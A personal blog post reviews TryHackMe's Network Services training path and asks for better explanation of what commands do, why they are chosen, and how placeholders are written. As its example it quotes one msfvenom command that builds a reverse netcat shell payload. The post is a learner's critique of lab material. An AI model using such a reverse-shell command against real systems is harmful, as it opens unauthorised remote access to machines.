---
layout: post
title: Working through THM Network Services 
date: 2022-11-24-00-31-58
categories: [Uncategorized]
---

In the past few days I've been working through Try Hack Me's Network services section and overall it's a solid introduction to different services and the issues they can have along with how to enumerate services to figure out what's going on.

I think the section is good, but it could use some improvements, namely:

1.  It needs to explain WHAT is happening

Too often a command or set of commands will be presented without explaining what is happening in the background with the expectation that if something is typed in the result will be as expected.

2.  WHY a command is being used

Commands can be utilized but it needs to go more in depth as to why it's that command or tool that's being utilized as opposed to potential alternatives.

3.  Clarity

This is a derivative of the points above, but there are points where it's easy to get confused in the commands because hey, code is weird sometimes.  For instance it's possible to get lost understanding the following:

```
msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R
```

Let's break this down according to all the points we have

- msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R

With this command we're told that we're creating a reverse shell on a target machine, but WHY are we using msfvenom, are there other tools we could use, is there a preference on tools or are different tools situational?

WHAT is the command doing from the switch through the rest of the line, are there other commands/reverse shells we could use?

Clarity: the section: lhost=[local tun0 ip] is unclear because it's VERY easy to confuse [local tun0 ip] as valid code, especially if we think we're using a list/array structure.  What should be done to make this clear is something like:

lhost=<LOCAL eth0 OR lan0 IP ADDRESS HERE> lport=<SPECIFIED PORT HERE>

This way it's extremely clear as to what's being asked for and why

In the FTP section, this kind of explanation is provided with hydra (with some caveats), but overall the learning experience is solid and could use some refinement.

